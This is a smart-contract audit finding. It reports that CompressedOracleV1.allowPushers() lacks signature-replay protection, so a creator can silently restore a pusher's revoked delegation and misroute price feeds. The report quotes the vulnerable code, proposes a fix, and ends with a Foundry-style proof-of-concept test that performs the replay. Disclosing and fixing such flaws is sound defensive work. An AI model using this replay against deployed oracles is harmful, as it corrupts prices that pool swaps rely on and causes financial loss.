### Title
`allowPushers()` Delegation Signature Replay Allows Creator to Silently Re-establish Revoked Pusher Authority Within Deadline Window — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers()` contains no used-signature tracking or per-pusher nonce. A creator who holds a pusher's valid EIP-191 consent signature can call `allowPushers()` repeatedly with the same signature bytes as long as `block.timestamp <= deadline`, including after the pusher has called `revokePusher()`. This silently re-establishes the delegation the pusher intended to permanently remove, redirecting the pusher's subsequent fallback writes into the creator's namespace without the pusher's knowledge.

---

### Finding Description

`allowPushers()` validates the pusher's consent by recovering the signer from an EIP-191 hash that commits to `(block.chainid, address(this), deadline, pusher, msg.sender)`:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
```

The code's own NatSpec comment acknowledges the risk:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

The deadline is intended to be the guard against post-revocation replay. However, `_ensureDeadline` only checks `block.timestamp <= deadline`:

```solidity
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
```

There is no used-signature bitmap, no per-pusher nonce, and no check that `namespaceRemapping[pusher]` is currently zero before writing. The same `(deadline, sig)` tuple is therefore replayable an unlimited number of times within the deadline window. After `revokePusher()` clears `namespaceRemapping[pusher]` to `address(0)`, the creator can immediately call `allowPushers()` again with the identical calldata to restore `namespaceRemapping[pusher] = creator`, undoing the revocation.

The `fallback()` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
```

So every push the pusher makes after believing they have revoked will land in the creator's namespace, not their own.

---

### Impact Explanation

**Bad-price execution reaching live pool swaps.**

Concrete scenario:

1. Pusher P is delegated to Creator A and pushes ETH/USD prices into A's namespace (slot 0, position 0). A pool is configured to consume `feedIdOf(A, 0, 0)`.
2. P revokes (`revokePusher()`) because they now operate a BTC/USD feed in their own namespace.
3. P begins pushing BTC/USD prices, expecting them to land in `feedIdOf(P, 0, 0)`.
4. Creator A replays the original `(deadline, sig)` tuple via `allowPushers()`. `namespaceRemapping[P]` is restored to `A`.
5. P's BTC/USD pushes now overwrite `feedIdOf(A, 0, 0)` — the ETH/USD feed consumed by the pool — with BTC/USD prices.
6. The pool's `getBidAndAskPrice()` call reads the corrupted slot and executes swaps at BTC/USD prices for an ETH/USD pair.

The pusher has no on-chain signal that their revocation was undone; the `PusherAuthorized` event is emitted again but the pusher is not monitoring it. The pool has no mechanism to detect that the oracle namespace was silently re-delegated.

---

### Likelihood Explanation

**Medium.** The attack requires:
- A creator who retains the pusher's original `(deadline, sig)` bytes (trivially available from the original `allowPushers` calldata on-chain).
- The pusher to continue pushing data after revoking (normal operational behavior for an active oracle pusher).
- The original deadline to still be in the future (deadlines are typically set days ahead to accommodate operational windows).

All three conditions are routinely satisfied in a live oracle deployment. No privileged role is needed; the creator is a semi-trusted party who already participated in the delegation flow.

---

### Recommendation

Track consumed signatures to prevent replay. The minimal fix is a `mapping(bytes32 => bool) private _usedDelegationSigs` keyed on the full EIP-191 digest:

```solidity
mapping(bytes32 => bool) private _usedDelegationSigs;

function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    uint256 l = pushers.length;
    require(l == signatures.length);
    for (uint256 i; i < l; i++) {
        address pusher = pushers[i];
        if (pusher == msg.sender) revert NoSelfRemapping();

        bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
        );
+       require(!_usedDelegationSigs[hash], SignatureAlreadyUsed());
+       _usedDelegationSigs[hash] = true;

        require(pusher == ECDSA.recover(hash, signatures[i]));
        namespaceRemapping[pusher] = msg.sender;
        emit PusherAuthorized(pusher, msg.sender);
    }
}
```

Alternatively, include a per-pusher nonce in the signed payload so each consent is single-use by construction.

### Proof of Concept

```solidity
// 1. Creator A delegates pusher P (deadline = now + 1 day)
uint256 deadline = block.timestamp + 1 days;
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _sigs(sig));
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 2. Pusher revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// 3. Creator replays the SAME signature — no revert, delegation restored
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _sigs(sig)); // ← replay
assertEq(oracle.namespaceRemapping(pusher), creator);    // ← revocation undone

// 4. Pusher's next push (intended for own namespace) lands in creator's namespace
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 raw = _packRaw(BTC_PRICE, 5, 0); // pusher thinks this goes to feedIdOf(pusher,...)
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
assertTrue(ok);

// Creator's ETH/USD feed now contains BTC price — pool reads wrong price
IOffchainOracle.OracleData memory d = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
assertEq(d.price, U64x32.decode(uint32(raw >> 16))); // BTC price in ETH/USD slot
```
